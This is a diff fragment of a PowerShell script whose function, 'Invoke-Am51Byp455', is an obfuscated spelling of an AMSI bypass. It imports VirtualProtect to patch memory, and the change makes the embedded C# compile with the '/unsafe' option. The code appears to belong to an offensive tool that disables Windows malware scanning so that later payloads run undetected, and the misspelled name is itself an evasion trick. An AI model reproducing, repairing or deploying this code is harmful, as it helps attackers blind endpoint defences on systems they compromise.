@@ -28,7 +28,7 @@ public class Win32 {
     public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
 }
-"@
+"@ 
 
 
 
@@ -41,7 +41,9 @@ function Invoke-Am51Byp455{
         [String]$program= ''
     )
     Begin {
-		Add-Type $Win32
+		$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
+		$compilerParameters.CompilerOptions = "/unsafe"
+		Add-Type $Win32 -CompilerParameters $compilerParameters
     }
 
     Process {
